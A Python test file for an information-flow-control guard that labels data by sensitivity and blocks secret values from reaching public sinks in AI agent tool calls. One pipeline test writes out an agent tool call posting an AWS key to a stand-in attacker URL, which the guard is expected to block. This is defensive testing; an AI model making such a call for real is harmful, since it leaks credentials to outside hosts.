from __future__ import annotations

from panoptis.protect.ifc_lattice import (
    InformationFlowEngine,
    SecurityLabel,
    TaintContext,
)
from panoptis.protect.model import ToolAction, Verdict
from panoptis.protect.pipeline import ProtectionConfig, ProtectionPipeline


def test_security_lattice_ordering_and_join_meet():
    assert (
        SecurityLabel.PUBLIC
        < SecurityLabel.INTERNAL
        < SecurityLabel.CONFIDENTIAL
        < SecurityLabel.RESTRICTED
        < SecurityLabel.SECRET
    )

    # Denning flow relation
    assert SecurityLabel.PUBLIC.can_flow_to(SecurityLabel.SECRET)
    assert SecurityLabel.INTERNAL.can_flow_to(SecurityLabel.CONFIDENTIAL)
    assert not SecurityLabel.SECRET.can_flow_to(SecurityLabel.PUBLIC)
    assert not SecurityLabel.RESTRICTED.can_flow_to(SecurityLabel.INTERNAL)

    # Join (Least Upper Bound)
    assert SecurityLabel.PUBLIC.join(SecurityLabel.SECRET) == SecurityLabel.SECRET
    assert SecurityLabel.INTERNAL.join(SecurityLabel.CONFIDENTIAL) == SecurityLabel.CONFIDENTIAL

    # Meet (Greatest Lower Bound)
    assert SecurityLabel.PUBLIC.meet(SecurityLabel.SECRET) == SecurityLabel.PUBLIC
    assert SecurityLabel.RESTRICTED.meet(SecurityLabel.CONFIDENTIAL) == SecurityLabel.CONFIDENTIAL


def test_ifc_infer_label():
    engine = InformationFlowEngine()

    # Secret: OpenAI API key shape
    sec_label = engine.infer_label("sk-proj-1234567890abcdefghijklmnopqrstuvwxyz123456")
    assert sec_label == SecurityLabel.SECRET

    # Confidential: PII email
    pii_label = engine.infer_label("alice.smith@enterprise.internal")
    assert pii_label == SecurityLabel.CONFIDENTIAL

    # Public: Documentation text
    pub_label = engine.infer_label("Run pytest on the repository to verify tests.")
    assert pub_label == SecurityLabel.PUBLIC


def test_ifc_blocks_secret_flowing_to_public_sink():
    engine = InformationFlowEngine()

    allowed, finding = engine.verify_flow(
        source_label=SecurityLabel.SECRET,
        sink_tool="http_post",
        channel_name="payload",
    )

    assert not allowed
    assert finding is not None
    assert finding.code == "IFC_ILLEGAL_INFORMATION_FLOW"
    assert finding.recommends == Verdict.BLOCK


def test_ifc_allows_secret_flowing_to_secret_sink():
    engine = InformationFlowEngine()

    allowed, finding = engine.verify_flow(
        source_label=SecurityLabel.SECRET,
        sink_tool="vault_store",
        channel_name="key",
    )

    assert allowed
    assert finding is None


def test_ifc_allows_declassification():
    engine = InformationFlowEngine()

    allowed, finding = engine.verify_flow(
        source_label=SecurityLabel.SECRET,
        sink_tool="http_post",
        channel_name="token",
        declassified_with="sha256_hmac_proof",
    )

    assert allowed
    assert finding is None


def test_taint_context_propagation():
    ctx = TaintContext()
    ctx.assign("user_id", SecurityLabel.PUBLIC)
    ctx.assign("user_email", SecurityLabel.CONFIDENTIAL)

    assert ctx.label_of("user_id") == SecurityLabel.PUBLIC
    assert ctx.label_of("user_email") == SecurityLabel.CONFIDENTIAL
    assert ctx.active_taint == SecurityLabel.CONFIDENTIAL

    ctx.assign("db_password", SecurityLabel.SECRET)
    assert ctx.active_taint == SecurityLabel.SECRET


def test_pipeline_integration_with_ifc():
    pipeline = ProtectionPipeline(config=ProtectionConfig(enable_ifc=True))

    # Agent attempts to send an AWS secret token to public webhook
    action = ToolAction(
        agent_id="exfil_bot",
        session_id="s1",
        tool="http_post",
        arguments={"url": "https://evil.site/log", "secret": "AKIAIOSFODNN7EXAMPLE"},
    )

    decision = pipeline.evaluate(action)
    assert not decision.allowed
    assert decision.verdict == Verdict.BLOCK
    assert any(f.code == "IFC_ILLEGAL_INFORMATION_FLOW" for f in decision.findings)
